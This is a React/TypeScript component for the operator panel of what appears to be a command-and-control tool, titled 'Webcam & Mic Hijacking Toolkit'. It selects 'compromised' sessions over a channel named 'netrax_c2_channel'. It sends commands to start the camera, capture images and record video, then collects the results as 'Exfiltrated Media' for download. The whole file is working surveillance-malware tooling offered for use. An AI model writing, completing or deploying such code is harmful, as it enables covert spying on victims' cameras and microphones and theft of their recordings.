
'use client';

import { useState, useRef, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Save, Info, Webcam, AlertCircle } from 'lucide-react';
import { logActivity } from '@/services/activity-log-service';
import { useAuth } from '@/hooks/use-auth';
import { Badge } from './ui/badge';
import { ScrollArea } from './ui/scroll-area';
import { format } from 'date-fns';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { Label } from './ui/label';
import type { TrackedEvent } from './live-tracker';
import Image from 'next/image';

type MediaChunk = {
  id: string;
  dataUrl: string;
  type: 'video' | 'audio' | 'image';
  timestamp: string;
};

type WebcamHijackToolProps = {
    sessions: Map<string, TrackedEvent[]>;
    selectedSessionId: string | null;
    setSelectedSessionId: (id: string | null) => void;
}

export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessionId }: WebcamHijackToolProps) {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [isRecording, setIsRecording] = useState(false);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [capturedMedia, setCapturedMedia] = useState<MediaChunk[]>([]);
  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
  
  const hasActiveSession = selectedSessionId && sessions.has(selectedSessionId);
  const channelRef = useRef<BroadcastChannel | null>(null);

  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');
    
    const handleMessage = (event: MessageEvent) => {
        if (event.data.type === 'media-stream' && event.data.sessionId === selectedSessionId) {
            const { data } = event.data;
            if (data.type === 'image-snapshot') {
                setLiveFeedSrc(data.snapshot);
                setIsCameraActive(true);
            } else if (data.type.startsWith('video') || data.type.startsWith('audio') || data.type.startsWith('image')) {
                 const newChunk: MediaChunk = {
                    id: `media-${Date.now()}`,
                    dataUrl: data.dataUrl,
                    type: data.type.startsWith('video') ? 'video' : data.type.startsWith('image') ? 'image' : 'audio',
                    timestamp: new Date().toISOString()
                };
                setCapturedMedia(prev => [newChunk, ...prev]);
                toast({ title: "Media Captured!", description: `A new ${newChunk.type} file has been received.` });
            } else if (data.type === 'status') {
                if (data.message === 'Permissions granted.') {
                    setIsCameraActive(true);
                } else {
                    setIsCameraActive(false);
                    toast({ variant: 'destructive', title: 'Permission Error', description: `Target session reported: ${data.message}`});
                }
            }
        }
    };
    
    channelRef.current.addEventListener('message', handleMessage);

    return () => {
      channelRef.current?.removeEventListener('message', handleMessage);
      channelRef.current?.close();
    };
  }, [selectedSessionId, toast]);

  useEffect(() => {
      // Reset state when session changes
      setLiveFeedSrc(null);
      setIsCameraActive(false);
      setIsRecording(false);
  }, [selectedSessionId]);

  const sendCommandToSession = (command: string, options = {}) => {
    if (!selectedSessionId) {
        toast({ variant: 'destructive', title: 'No session selected' });
        return;
    }
    channelRef.current?.postMessage({
        type: 'command',
        sessionId: selectedSessionId,
        command,
        options,
    });
    logActivity({
        user: user?.displayName || 'Operator',
        action: `Sent command: ${command}`,
        details: `Session: ${selectedSessionId}`
    });
  };

  const downloadMedia = (chunk: MediaChunk) => {
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = chunk.dataUrl;
    const extension = chunk.type === 'image' ? 'png' : chunk.type === 'video' ? 'webm' : 'ogg';
    a.download = `${chunk.type}_${chunk.id}.${extension}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    toast({ title: "Media downloaded."});
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
            <Camera className="h-6 w-6" />
            <CardTitle>Webcam &amp; Mic Hijacking Toolkit</CardTitle>
        </div>
        <CardDescription>Remotely control the camera and microphone of a compromised session.</CardDescription>
      </CardHeader>
      <CardContent className="grid md:grid-cols-2 gap-8">
        <div className="space-y-4">
           <div className="space-y-2">
                <Label>Target Session</Label>
                 <Select value={selectedSessionId || ''} onValueChange={setSelectedSessionId} disabled={sessions.size === 0}>
                    <SelectTrigger>
                        <SelectValue placeholder="Select an active session..." />
                    </SelectTrigger>
                    <SelectContent>
                        {Array.from(sessions.keys()).map(id => (
                            <SelectItem key={id} value={id}>{id}</SelectItem>
                        ))}
                    </SelectContent>
                </Select>
           </div>
           
            <Card className="bg-primary/10">
                <CardHeader>
                    <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Video Feed</CardTitle>
                     {isCameraActive && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>}
                </CardHeader>
                <CardContent className="space-y-4">
                    <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
                        {liveFeedSrc ? (
                            <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/>
                        ) : (
                            <p className="text-muted-foreground">{hasActiveSession ? 'Camera feed is inactive.' : 'Select a session.'}</p>
                        )}
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                        <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession || isCameraActive}>Start Camera</Button>
                        <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive}>Capture Image</Button>
                        <Button onClick={() => { sendCommandToSession('start-video-record'); setIsRecording(true); }} disabled={!isCameraActive || isRecording}>Start Recording</Button>
                        <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsRecording(false); }} disabled={!isCameraActive || !isRecording} variant="destructive">Stop Recording</Button>
                    </div>
                </CardContent>
            </Card>

            <Card className="border-amber-400/50 bg-amber-400/10">
                <CardHeader className="flex flex-row items-center gap-3 space-y-0">
                    <Info className="h-5 w-5 text-amber-400" />
                    <CardTitle className="text-amber-400 text-base">Security Note</CardTitle>
                </CardHeader>
                <CardContent className="text-sm text-amber-400/80">
                    It is not possible to access a device's camera without activating the hardware indicator light. This is a security feature at the OS level. This toolkit demonstrates exploiting user trust after they grant permission, not bypassing the light itself.
                </CardContent>
            </Card>
        </div>
        
        <div className="space-y-4">
            <h3 className="font-semibold text-lg">Exfiltrated Media</h3>
            <Card className="h-full flex flex-col min-h-[400px]">
                <CardContent className="p-2 flex-grow">
                    <ScrollArea className="h-full max-h-[600px]">
                        <div className="p-4">
                         {capturedMedia.length === 0 ? (
                            <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
                         ) : (
                            <div className="space-y-3">
                                {capturedMedia.map(chunk => (
                                    <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
                                        <div className="flex items-center gap-3">
                                            {chunk.type === 'image' ? <ImageIcon className="h-5 w-5 text-accent"/> : <Video className="h-5 w-5 text-accent"/>}
                                            <div className="font-mono text-xs">
                                                <p className="capitalize">{chunk.type} Capture</p>
                                                <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'HH:mm:ss')}</p>
                                            </div>
                                        </div>
                                        <div className='flex items-center gap-2'>
                                            <Button size="icon" variant="ghost" onClick={() => downloadMedia(chunk)}><Download className="h-4 w-4"/></Button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                         )}
                         </div>
                    </ScrollArea>
                </CardContent>
            </Card>
        </div>
      </CardContent>
    </Card>
  );
}
